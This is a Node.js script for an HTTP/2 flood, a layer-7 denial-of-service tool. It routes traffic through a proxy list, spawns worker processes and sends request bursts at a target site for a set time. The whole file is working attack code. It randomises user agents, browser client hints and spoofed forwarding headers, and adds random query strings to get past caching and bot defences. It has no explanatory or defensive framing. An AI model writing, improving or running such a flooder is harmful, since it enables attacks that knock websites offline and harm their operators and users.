const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};
const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pkcs1_sha1',
    'hmac_sha1',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512'
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json',
    'application/xml',
    'application/pdf',
    'text/css',
    'application/javascript',
    'application/ld+json',
    'application/vnd.api+json'
];
const lang_header = [
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'ko-KR',
    'en-US,en;q=0.9',
    'zh-CN,zh;q=0.8',
    'zh-TW,zh;q=0.7',
    'en-ZA',
    'fr-FR',
    'ja-JP',
    'ar-EG',
    'de-DE',
    'es-ES',
    'it-IT',
    'pt-BR',
    'ru-RU'
];
const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'identity',
    'compress',
    'br',
    'gzip, br',
    'gzip'
];
const methods = [
    "GET", "HEAD", "POST", "DELETE", "PATCH"
];
const cache_control = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'private',
    'proxy-revalidate',
    'public'
];
const sec_ch_ua = [
    '"Chromium";v="137", "Not/A)Brand";v="24"',
    '"Google Chrome";v="140", "Chromium";v="140", "Not/A)Brand";v="24"',
    '"Microsoft Edge";v="140", "Chromium";v="140", "Not/A)Brand";v="24"',
    '"Brave";v="1", "Chromium";v="140", "Not/A)Brand";v="24"',
    '"Opera";v="90", "Chromium";v="140", "Not/A)Brand";v="24"'
];
const sec_ch_ua_mobile = [
    "?0", "?1"
];
const sec_ch_ua_platform = [
    "Linux",
    "Windows",
    "macOS",
    "Android",
    "iOS",
    "Chrome OS",
    "FreeBSD",
    "OpenBSD"
];
const sec_ch_ua_arch = [
    "x86",
    "x86_64",
    "arm",
    "arm64"
];
const sec_fetch_dest = [
    "document",
    "script",
    "image",
    "style",
    "font",
    "empty",
    "frame",
    "iframe"
];
const sec_fetch_mode = [
    "navigate",
    "no-cors",
    "cors",
    "same-origin"
];
const sec_fetch_site = [
    "none",
    "same-origin",
    "same-site",
    "cross-site"
];
const sec_fetch_user = [
    "?1",
    "?0"
];
const cache_mode = [
    "default",
    "no-store",
    "reload",
    "no-cache",
    "force-cache",
    "only-if-cached"
];
const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "proxy-client-ip": randstr(12) },
    { "via": randstr(12) },
    { "cluster-ip": randstr(12) },
    { "x-forwarded-for": randstr(12) },
    { "forwarded": randstr(12) },
    { "true-client-ip": randstr(12) },
    { "user-agent": randstr(12) },
    { "cf-connecting-ip": randstr(12) }
];
let proxies = readLines(args.proxyFile);
function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}
shuffleArray(proxies);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
} else {
    setInterval(runFlooder);
}
class NetSocket {
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 100000);
        connection.on("connect", () => {
            connection.write(buffer);
        });
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const customUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
];
function generateUserAgent() {
    if (Math.random() < 0.6) {
        return new UserAgent({
            deviceCategory: randomElement(['desktop', 'mobile', 'tablet']),
            platform: randomElement(['Win32', 'MacIntel', 'Linux x86_64', 'iPhone', 'Android'])
        }).toString();
    } else {
        return randomElement(customUserAgents);
    }
}
const Socker = new NetSocket();
function generateHeaders() {
    return {
        ":method": randomElement(methods),
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + (parsedTarget.path.includes("?") ? "&" : "?") + randstr(10) + "=" + randstr(5),
        ":scheme": "https",
        "user-agent": generateUserAgent(),
        "accept": randomElement(accept_header),
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(lang_header),
        "cache-control": randomElement(cache_control),
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-mobile": randomElement(sec_ch_ua_mobile),
        "sec-ch-ua-platform": randomElement(sec_ch_ua_platform),
        "sec-ch-ua-arch": randomElement(sec_ch_ua_arch),
        "sec-fetch-dest": randomElement(sec_fetch_dest),
        "sec-fetch-mode": randomElement(sec_fetch_mode),
        "sec-fetch-site": randomElement(sec_fetch_site),
        "sec-fetch-user": randomElement(sec_fetch_user),
        "upgrade-insecure-requests": "1",
        "x-requested-with": "XMLHttpRequest",
        "cache-mode": randomElement(cache_mode)
    };
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            connection?.close();
            connection?.destroy();
            return;
        }
        const tlsOptions = (() => {
            const useTlsOption2 = (Math.random() < 0.5);
            return useTlsOption2 ?
                {
                    secure: true,
                    ALPNProtocols: ['h2'],
                    sigals: randomElement(sig),
                    socket: connection,
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                    ecdhCurve: 'P-256:P-384',
                    host: parsedTarget.host,
                    servername: parsedTarget.host,
                    rejectUnauthorized: false
                } :
                {
                    secure: true,
                    ALPNProtocols: ['h2'],
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                    ecdhCurve: 'auto',
                    rejectUnauthorized: false,
                    servername: parsedTarget.host,
                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                        crypto.constants.SSL_OP_NO_TICKET |
                        crypto.constants.SSL_OP_NO_COMPRESSION |
                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
                        crypto.constants.SSL_OP_SINGLE_DH_USE |
                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                        crypto.constants.SSL_OP_NO_QUERY_MTU
                };
        })();
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            setInterval(() => {
                const dynHeaders = {
                    ...generateHeaders(),
                    ...rateHeaders[randomIntn(0, rateHeaders.length)]
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, randomIntn(200, 501));
        });
        client.on("close", () => {
            client.destroy();
        });
    });
}
setTimeout(() => process.exit(1), args.time * 1000);
